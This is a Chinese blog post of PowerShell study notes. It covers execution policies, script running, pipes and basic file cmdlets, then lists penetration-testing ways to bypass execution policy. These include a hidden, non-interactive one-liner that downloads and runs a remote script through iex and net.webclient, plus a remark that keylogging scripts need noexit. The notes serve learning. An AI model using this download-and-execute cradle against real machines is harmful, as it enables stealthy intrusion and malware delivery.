---
layout:     post                    # 使用的布局（不需要改）
title:      powershell笔记整理               # 标题 
subtitle:   回顾整理一下之前的学习笔记
date:       2020-03-30              # 时间
author:     z0L1n                      # 作者
header-img: img/post-bg-2015.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - web漏洞
---

## 0x00powershell简单介绍：
> windows powershell是一种命令行外壳程序和脚本环境，它内置在每个受支持的windows（windows7、windows 2008 R2和更高版本）版本中，可以利用.NET framework的强大功能。
powershell的优点：
- ·windows7以上版本默认安装
- ·powershell脚本可以运行在内存中，不需要写入磁盘
- ·ps脚本可以跨系统，许多工具也是基于powershell开发的
- ·很多安全软件不能检测到powershell的活动
- ·cmd.exe通常会被阻止运行，但是powershell不会
- ·可以用来管理活动目录

powershell的有关基本概念：      
2.1powershell文件：  
一个powershell脚本其实就是一个简单的文本文件，拓展名为.PS1.其中的powershell命令独立一行。  
2.2执行策略：  
为防止恶意脚本的执行，powershell有一个执行策略，默认情况下，这个执行策略被设为受限、所以在powershell脚本无法执行时，可以使用下面的cmdlet命令确定当前的执行策略。  
Get-ExecutionPolicy：
- ·Restricted：脚本不能运行
- ·RemoteSigned：本地创建的脚本可以运行，从网上下载的脚本不能运行（拥有数字证书签名的除外）
- ·AllSigned:仅当脚本由受信任的发布者签名时才能运行。
- ·Unrestricted：允许所有的script运行

可以利用下面的cmdlet命令设置powershell的执行策略  
`Set-ExecutionPolicy <policy name>  `  
2.3运行脚本：  
运行一个ps脚本，必须键入完整的路径和文件名，如果恰好ps脚本位于系统目录中，那么可以".\xxx.ps1"直接执行  
2.4管道：  
管道的作用是将一个命令的输入作为另一个命令的输入，两个命令用管道符号（|）连接。  
例如：get-process p* | stop-process  
3、powershell常用命令：  
文件操作：  
·新建目录：new-item whitecellclub-itemtype directory  
·新建文件：new-item light.txt-itemtype file  
·删除目录: remove-item whitecellclub  
·显示文本内容：get-content test.txt  
·设置文本内容：set-content test.txt-value"hello,world"  
追加内容：add-content light.txt-value"I love you"  
清除内容：clear-content test.txt  
如需帮助，输入help命令显示帮助菜单  
运行powershell脚本时，需要用管理员权限将restricted策略改成unrestricted，所以在渗透时，就需要采用一些方法绕过策略来执行脚本，如下：  
- ①绕过本地权限执行：`Powershell.exe-executionpolicy bypass-file xxx.ps1`,执行本地文件
- ②本地隐藏绕过权限执行脚本：`Powershell.exe-executionpolicy bypass-windowstyle hidden-nologo-noninteractive-noprofile-file xxx.ps1`
- ③用iex下载远程ps1脚本绕过权限执行：Powershell.exe-executionpolicy bypass-windowstyle hidden-noprofile-noni iex(new-objectnet.webclient) .downloadstring("xxx.ps1");[parameters]

参数说明：
Windowstyle hidden:隐藏窗口
Nologo: 启动不显示版权标志的powershell
Noninteractive(noni):非交互模式，powershell不为用户提供交互的提示
noprofile（nop）：powershell控制台不加载当前用户的配置文件
noexit：执行后不退出脚本，在使用键盘记录等脚本时非常重要、


